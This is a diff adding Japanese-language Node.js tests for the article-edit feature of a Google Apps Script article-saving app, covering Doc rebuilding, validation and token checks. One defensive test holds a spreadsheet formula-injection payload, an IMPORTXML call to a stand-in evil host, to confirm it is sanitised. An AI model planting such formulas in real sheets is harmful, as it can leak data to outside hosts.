@@ -1214,11 +1214,182 @@ test('ルートフォルダ: IDキャッシュ利用時もフォルダが二重�
   assert.strictEqual(knowledgeFolders.length, 1, '「ナレッジ」フォルダは1つだけ');
 });
 
+// ---- 記事の編集（action=update）とその補助関数 ------------------------
+
+test('fileId抽出: Driveファイル列のHYPERLINK数式からfileIdを取り出せる', () => {
+  const { context } = loadGasScript();
+  assert.strictEqual(
+    context.extractFileIdFromFormula_('=HYPERLINK("https://docs.google.com/document/d/ABC_12-3/edit","開く")'),
+    'ABC_12-3'
+  );
+  assert.strictEqual(context.extractFileIdFromFormula_(''), '', '数式なしは空文字');
+  assert.strictEqual(context.extractFileIdFromFormula_(null), '', 'nullも空文字');
+  assert.strictEqual(
+    context.extractFileIdFromFormula_('=HYPERLINK("https://example.com/","開く")'),
+    '', 'ドキュメントURL形式でない数式は空文字'
+  );
+});
+
+test('Doc本文抽出: 共有時のURL行と本文（自動抽出・参考）節を取り出せる（無ければ空文字）', () => {
+  const { context } = loadGasScript();
+  const docText = [
+    '# 旧タイトル',
+    '',
+    '- URL: https://old.example.com/a',
+    '- 共有時のURL（短縮/リダイレクト元）: https://share.google/xyz',
+    '- 保存日時: 2026-07-01 10:00',
+    '- カテゴリ: PC系',
+    '',
+    '## 本文（自動抽出・参考）',
+    '',
+    'これは抽出された本文です。',
+    ''
+  ].join('\n');
+
+  assert.strictEqual(context.extractDocOriginalUrl_(docText), 'https://share.google/xyz');
+  assert.strictEqual(context.extractDocBodyText_(docText), 'これは抽出された本文です。');
+  assert.strictEqual(context.extractDocOriginalUrl_('# タイトルのみ'), '', '共有時URL行が無ければ空文字');
+  assert.strictEqual(context.extractDocBodyText_('# タイトルのみ'), '', '本文節が無ければ空文字');
+});
+
+test('Doc再構築: タイトル・URL・メモを差し替えつつ、共有時URLと自動抽出本文は引き継ぐ', () => {
+  const { context } = loadGasScript();
+  const currentText = [
+    '# 旧タイトル',
+    '',
+    '- URL: https://old.example.com/a',
+    '- 共有時のURL（短縮/リダイレクト元）: https://share.google/xyz',
+    '- 保存日時: 2026-07-01 10:00',
+    '- カテゴリ: PC系',
+    '',
+    '## 本文（自動抽出・参考）',
+    '',
+    'これは抽出された本文です。',
+    ''
+  ].join('\n');
+
+  const rebuilt = context.rebuildDocContent_(
+    currentText, '2026-07-01 10:00', 'PC系', '新タイトル', 'https://new.example.com/b', '新メモ'
+  );
+
+  assert.match(rebuilt, /^# 新タイトル$/m, 'タイトルが差し替わること');
+  assert.match(rebuilt, /^- URL: https:\/\/new\.example\.com\/b$/m, 'URLが差し替わること');
+  assert.match(rebuilt, /^- 共有時のURL（短縮\/リダイレクト元）: https:\/\/share\.google\/xyz$/m, '共有時URLを引き継ぐこと');
+  assert.match(rebuilt, /^- 保存日時: 2026-07-01 10:00$/m, '保存日時は変えないこと');
+  assert.match(rebuilt, /^- カテゴリ: PC系$/m, 'カテゴリは変えないこと');
+  assert.match(rebuilt, /## メモ\n\n新メモ/, 'メモが差し替わること');
+  assert.match(rebuilt, /## 本文（自動抽出・参考）\n\nこれは抽出された本文です。/, '自動抽出本文を引き継ぐこと');
+  assert.doesNotMatch(rebuilt, /旧タイトル|旧メモ/, '旧の編集対象値が残らないこと');
+});
+
+test('編集API正常系: 一覧のfileIdで更新でき、Sheets行とDoc本文の両方に反映される', () => {
+  const { context, spreadsheetsById } = loadGasScript({
+    fetchImpl: () => makeFetchResponse({ body: '<title>元のタイトル</title>' })
+  });
+  callDoPost(context, { url: 'https://example.com/old', category: 'PC系', memo: '元メモ' });
+
+  const listed = callDoGetList(context, 'PC系');
+  const fileId = listed.items[0].fileId;
+  assert.ok(fileId, '一覧APIが編集キーのfileIdを返すこと');
+
+  const result = callDoPost(context, {
+    action: 'update', fileId: fileId,
+    title: '新タイトル', url: 'https://example.com/new', memo: '新メモ'
+  });
+  assert.strictEqual(result.ok, true);
+
+  // 別レイヤー確認1: 一覧APIの返却値に反映されている
+  const after = callDoGetList(context, 'PC系');
+  assert.strictEqual(after.items[0].title, '新タイトル');
+  assert.strictEqual(after.items[0].url, 'https://example.com/new');
+  assert.strictEqual(after.items[0].memo, '新メモ');
+  assert.strictEqual(after.items[0].fileId, fileId, 'fileIdは変わらないこと');
+
+  // 別レイヤー確認2: Sheetsのタイトル列はHYPERLINK数式のまま新URLを指す
+  const sheet = Object.values(spreadsheetsById)[0]._sheet;
+  assert.strictEqual(
+    sheet._formulas[1][2],
+    '=HYPERLINK("https://example.com/new","新タイトル")'
+  );
+
+  // 別レイヤー確認3: Googleドキュメント本文も更新される（保存日時・カテゴリは保持）
+  const docText = context.DocumentApp.openById(fileId).getBody().getText();
+  assert.match(docText, /^# 新タイトル$/m);
+  assert.match(docText, /^- URL: https:\/\/example\.com\/new$/m);
+  assert.match(docText, /^- カテゴリ: PC系$/m);
+  assert.match(docText, /## メモ\n\n新メモ/);
+});
+
+test('編集API異常系: fileId無し・未知のfileId・タイトル空・URL形式不正はエラーになる', () => {
+  const { context } = loadGasScript({
+    fetchImpl: () => makeFetchResponse({ body: '<title>元のタイトル</title>' })
+  });
+  callDoPost(context, { url: 'https://example.com/old', category: 'PC系' });
+  const fileId = callDoGetList(context, 'PC系').items[0].fileId;
+
+  const cases = [
+    [{ action: 'update', title: 't', url: 'https://a.example/' }, '編集対象が指定されていません'],
+    [{ action: 'update', fileId: 'doc-存在しない', title: 't', url: 'https://a.example/' }, '編集対象の記事が見つかりません'],
+    [{ action: 'update', fileId: fileId, title: '', url: 'https://a.example/' }, 'タイトルを入力してください'],
+    [{ action: 'update', fileId: fileId, title: 't', url: 'ftp://a.example/' }, 'URLの形式が不正です']
+  ];
+  for (const [body, message] of cases) {
+    const result = callDoPost(context, body);
+    assert.strictEqual(result.ok, false, JSON.stringify(body) + ' はエラーになること');
+    assert.match(result.error, new RegExp(message));
+  }
+});
+
+test('編集API認可: SHARED_TOKEN設定時、合言葉が違うupdateは拒否される', () => {
+  const { context } = loadGasScript({
+    fetchImpl: () => makeFetchResponse({ body: '<title>元のタイトル</title>' }),
+    scriptProperties: { SHARED_TOKEN: 'aikotoba' }
+  });
+  callDoPost(context, { url: 'https://example.com/old', category: 'PC系', token: 'aikotoba' });
+  const fileId = callDoGetList(context, 'PC系', 'aikotoba').items[0].fileId;
+
+  const denied = callDoPost(context, {
+    action: 'update', fileId: fileId, title: '改ざん', url: 'https://evil.example/', token: 'ちがう'
+  });
+  assert.strictEqual(denied.ok, false);
+  assert.match(denied.error, /合言葉が一致しません/);
+
+  const allowed = callDoPost(context, {
+    action: 'update', fileId: fileId, title: '正規の編集', url: 'https://example.com/new', token: 'aikotoba'
+  });
+  assert.strictEqual(allowed.ok, true);
+});
+
+test('編集API防御: メモの数式インジェクションはサニタイズされ、タイトルの引用符は数式内でエスケープされる', () => {
+  const { context, spreadsheetsById } = loadGasScript({
+    fetchImpl: () => makeFetchResponse({ body: '<title>元のタイトル</title>' })
+  });
+  callDoPost(context, { url: 'https://example.com/old', category: 'PC系' });
+  const fileId = callDoGetList(context, 'PC系').items[0].fileId;
+
+  const result = callDoPost(context, {
+    action: 'update', fileId: fileId,
+    title: '新"タイトル"', url: 'https://example.com/new', memo: '=IMPORTXML("https://evil.example/","//a")'
+  });
+  assert.strictEqual(result.ok, true);
+
+  const sheet = Object.values(spreadsheetsById)[0]._sheet;
+  assert.strictEqual(
+    sheet._rows[1][4], "'=IMPORTXML(\"https://evil.example/\",\"//a\")",
+    'メモ先頭の = はアポストロフィで無害化されること'
+  );
+  assert.strictEqual(
+    sheet._formulas[1][2],
+    '=HYPERLINK("https://example.com/new","新""タイトル""")',
+    'タイトル内の引用符は数式リテラル内でエスケープされること'
+  );
+});
+
 // ---- 新規追加関数の重複定義チェック（教訓の再発防止パターン） ----------
 
 test('Code.gs: 主要関数の定義がそれぞれちょうど1つである（重複定義の再発防止）', () => {
   const source = fs.readFileSync(path.join(__dirname, '..', 'gas', 'Code.gs'), 'utf8');
-  for (const fn of ['handleReorderCategories_', 'getOrCreateRootFolder_', 'handleList_', 'getOrCreateIndexSheet_', 'appendIndexRow_', 'doGet', 'doPost']) {
+  for (const fn of ['handleReorderCategories_', 'getOrCreateRootFolder_', 'handleList_', 'getOrCreateIndexSheet_', 'appendIndexRow_', 'doGet', 'doPost', 'handleUpdate_', 'extractFileIdFromFormula_', 'rebuildDocContent_', 'extractDocOriginalUrl_', 'extractDocBodyText_']) {
     const definitions = source.match(new RegExp('function ' + fn + '\\(', 'g')) || [];
     assert.strictEqual(definitions.length, 1, fn + ' の定義がちょうど1つであること');
   }
